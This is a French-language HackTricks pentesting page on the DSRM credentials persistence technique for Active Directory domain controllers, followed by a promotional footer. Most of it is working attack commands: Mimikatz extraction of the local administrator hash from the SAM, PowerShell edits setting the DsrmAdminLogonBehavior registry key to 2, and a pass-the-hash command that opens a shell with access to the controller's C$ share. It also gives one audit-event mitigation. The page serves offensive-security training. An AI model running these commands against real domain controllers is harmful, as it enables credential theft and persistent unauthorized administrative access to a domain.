# Identifiants DSRM

Il y a un compte **administrateur local** dans chaque **DC**. En ayant des privilèges d'administrateur sur cette machine, vous pouvez utiliser Mimikatz pour **extraire le hash de l'administrateur local**. Ensuite, en modifiant une clé de registre pour **activer ce mot de passe**, vous pouvez accéder à distance à cet utilisateur Administrateur local.\
Tout d'abord, nous devons **extraire** le **hash** de l'utilisateur **administrateur local** à l'intérieur du DC :
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Ensuite, nous devons vérifier si ce compte fonctionnera, et si la clé de registre a la valeur "0" ou si elle n'existe pas, vous devez **la définir sur "2"**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
Ensuite, en utilisant un PTH, vous pouvez **lister le contenu de C$ ou même obtenir un shell**. Notez que pour créer une nouvelle session powershell avec ce hash en mémoire (pour le PTH), **le "domaine" utilisé est simplement le nom de la machine DC :**
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
Plus d'informations à ce sujet sur: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) et [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)

## Atténuation

* ID d'événement 4657 - Audit de la création/modification de `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Travaillez-vous dans une **entreprise de cybersécurité**? Voulez-vous voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!

- Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
